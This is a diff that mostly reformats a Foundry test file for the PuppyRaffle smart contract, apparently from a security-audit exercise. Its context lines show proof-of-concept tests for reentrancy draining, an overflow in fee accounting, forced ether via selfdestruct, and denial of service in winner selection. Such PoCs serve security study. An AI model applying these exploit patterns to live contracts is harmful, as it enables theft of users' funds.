@@ -16,11 +16,7 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
@@ -225,7 +221,6 @@ contract PuppyRaffleTest is Test {
         address alice = makeAddr("alice");
         deal(alice, 1 ether);
 
-
         address[] memory players2 = new address[](1);
         uint256 gasStartAlice = gasleft();
         players2[0] = alice;
@@ -242,16 +237,15 @@ contract PuppyRaffleTest is Test {
         uint256 gasStartCris = gasleft();
         address cris = makeAddr("cris");
         deal(cris, 100 ether);
-        vm.prank(cris);  
+        vm.prank(cris);
         puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerx);
         uint256 gasLeftCris = gasStartCris - gasleft();
-
 
         // Gas consumed by next 100 players
         uint256 count = 0;
         address[] memory playerz = new address[](100);
         for (uint256 idx; idx < playerz.length; idx++) {
-            address play__er = address(uint160(idx+playerz.length));
+            address play__er = address(uint160(idx + playerz.length));
             playerz[count] = play__er;
             count += 1;
         }
@@ -259,10 +253,9 @@ contract PuppyRaffleTest is Test {
         uint256 gasStartDock = gasleft();
         address Dock = makeAddr("Dock");
         deal(Dock, 100 ether);
-        vm.prank(Dock);  
+        vm.prank(Dock);
         puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerz);
         uint256 gasLeftDock = gasStartDock - gasleft();
-
 
         console.log("Gas consumed by alice: %s", gasLeftAlice);
         console.log("Gas consumed by 100 players: %s", gasLeftCris);
@@ -280,9 +273,9 @@ contract PuppyRaffleTest is Test {
 
         address[] memory arr = new address[](1);
         arr[0] = address(attacker);
-        
+
         vm.prank(address(attacker));
-        puppyRaffle.enterRaffle{value:entranceFee}(arr);
+        puppyRaffle.enterRaffle{value: entranceFee}(arr);
 
         console.log("puppyRaffle balance before attack: %s", address(puppyRaffle).balance);
         console.log("attackContract balance before attack: %s", address(attacker).balance);
@@ -302,19 +295,19 @@ contract PuppyRaffleTest is Test {
         console.log("attackContract balance after attack: %s", address(attacker).balance);
         assertEq(address(puppyRaffle).balance, 0);
         assertEq(address(attacker).balance, 5 ether);
-
     }
 
     function aliceEntered(address alice) public {
         deal(alice, 100 ether);
         address[] memory enterAttacker = new address[](1);
-        enterAttacker[0] = alice; 
+        enterAttacker[0] = alice;
         vm.prank(alice);
-        puppyRaffle.enterRaffle{value:entranceFee}(enterAttacker);
+        puppyRaffle.enterRaffle{value: entranceFee}(enterAttacker);
     }
     /**
      * @dev Complete the function later
      */
+
     function testExploitRandomnessInSelectWinner() public playersEntered {
         address alice = makeAddr("alice");
         aliceEntered(alice);
@@ -335,13 +328,13 @@ contract PuppyRaffleTest is Test {
         aliceEntered(alice);
 
         address[] memory playerx = new address[](88);
-        for (uint256 idx=0; idx < 88; idx++) {
-            address player = address(uint160(idx+5));
+        for (uint256 idx = 0; idx < 88; idx++) {
+            address player = address(uint160(idx + 5));
             playerx[idx] = player;
         }
 
         vm.prank(alice);
-        puppyRaffle.enterRaffle{value:entranceFee * playerx.length}(playerx);
+        puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerx);
 
         // 93 ether
         console.log("Contract balance before: %s", address(puppyRaffle).balance);
@@ -357,11 +350,10 @@ contract PuppyRaffleTest is Test {
         /**
          * @notice Overflow!
          * totalFees is uint64 and type(uint64).max is 18.4 ether. Any value beyond that overflows
-         * Desired totalFees 93 * 0.2 ~= 18.6 ether 
+         * Desired totalFees 93 * 0.2 ~= 18.6 ether
          * Actual totalFees: 153255926290448384 ~ 0.15 ether
          *  Actual contract balance: 18.6 ether
          */
-
         assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);
 
         vm.expectRevert();
@@ -378,22 +370,22 @@ contract PuppyRaffleTest is Test {
         // 0.8 ether -> totalFees
         puppyRaffle.selectWinner();
 
-        // contract balance: 0.8 ether. 
+        // contract balance: 0.8 ether.
         // Total fees: 0.8 ether.
-        console.log("Contract balance before attack: %s" ,address(puppyRaffle).balance);
-        console.log("Contract totalFees before attack: %s" ,puppyRaffle.totalFees());
+        console.log("Contract balance before attack: %s", address(puppyRaffle).balance);
+        console.log("Contract totalFees before attack: %s", puppyRaffle.totalFees());
 
         vm.startPrank(alice);
-        ReentrancyAttacker attacker = new ReentrancyAttacker{value:1 ether}(address(puppyRaffle));
+        ReentrancyAttacker attacker = new ReentrancyAttacker{value: 1 ether}(address(puppyRaffle));
         // Send 1 ether to puppy raffle through selfdestruct
         attacker.destruct(address(puppyRaffle));
         vm.stopPrank();
 
         // Discrepancy
-        // contract balance: 1.8 ether. 
+        // contract balance: 1.8 ether.
         // Total fees: 0.8 ether.
-        console.log("Contract balance after attack: %s" ,address(puppyRaffle).balance);
-        console.log("Contract totalFees after attack: %s" ,puppyRaffle.totalFees());
+        console.log("Contract balance after attack: %s", address(puppyRaffle).balance);
+        console.log("Contract totalFees after attack: %s", puppyRaffle.totalFees());
 
         assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);
 
@@ -401,8 +393,7 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.withdrawFees();
     }
 
-    function testSelectWinnerDOS() public { 
-
+    function testSelectWinnerDOS() public {
         address[] memory players = new address[](4);
         players[0] = (address(new ReentrancyAttacker(address(puppyRaffle))));
         players[1] = (address(new ReentrancyAttacker(address(puppyRaffle))));
@@ -415,7 +406,6 @@ contract PuppyRaffleTest is Test {
 
         vm.expectRevert();
         puppyRaffle.selectWinner();
-    
     }
 }
 
